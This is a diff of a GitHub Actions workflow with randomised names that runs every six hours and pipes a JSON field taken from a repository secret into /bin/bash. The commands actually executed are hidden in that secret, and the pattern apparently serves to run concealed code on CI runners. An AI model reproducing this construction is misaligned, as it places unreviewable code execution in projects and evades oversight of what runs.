@@ -2,28 +2,28 @@ name: wuqidong4645
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 2/6 * * *'
+    - cron: '2 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: wuqidong4645
         env:
-          u3852: ${{ secrets.u3852 }}
+          i6: ${{ secrets.i6 }}
         run: |
-          echo $u3852 | jq -r .ojk27762 | /bin/bash
-          echo $ep58003 | jq -r .b00902 | /bin/bash
-          echo $nwkes947 | jq -r .uv10 | /bin/bash
-          echo $of29 | jq -r .puyne9 | /bin/bash
-          echo $saux80 | jq -r .uw84 | /bin/bash
-          echo $mgji2591 | jq -r .z87437 | /bin/bash
-          echo $prv15 | jq -r .xa6174 | /bin/bash
-          echo $jt3934 | jq -r .cggp35 | /bin/bash
-          echo $mwtvf067 | jq -r .zt86 | /bin/bash
-          echo $upmcf631 | jq -r .pe235 | /bin/bash
-          echo $knqg43 | jq -r .jdyap298 | /bin/bash
-          echo $iu2 | jq -r .qq13882 | /bin/bash
-          echo $egr616 | jq -r .bm392 | /bin/bash
-          echo $jqfg17915 | jq -r .jbvw2525 | /bin/bash
+          echo $i6 | jq -r .woz9664 | /bin/bash
+          echo $x0930 | jq -r .fgdfc20 | /bin/bash
+          echo $qrl35166 | jq -r .w320 | /bin/bash
+          echo $yqhpc11 | jq -r .beb1964 | /bin/bash
+          echo $piu9640 | jq -r .t0 | /bin/bash
+          echo $aa8 | jq -r .fynm4 | /bin/bash
+          echo $smitn8 | jq -r .avg86481 | /bin/bash
+          echo $bte66982 | jq -r .khopl50469 | /bin/bash
+          echo $mdp34 | jq -r .prqd394 | /bin/bash
+          echo $bx5997 | jq -r .yt65 | /bin/bash
+          echo $oemcu91 | jq -r .zkdpy16890 | /bin/bash
+          echo $nsaso132 | jq -r .uzx349 | /bin/bash
 
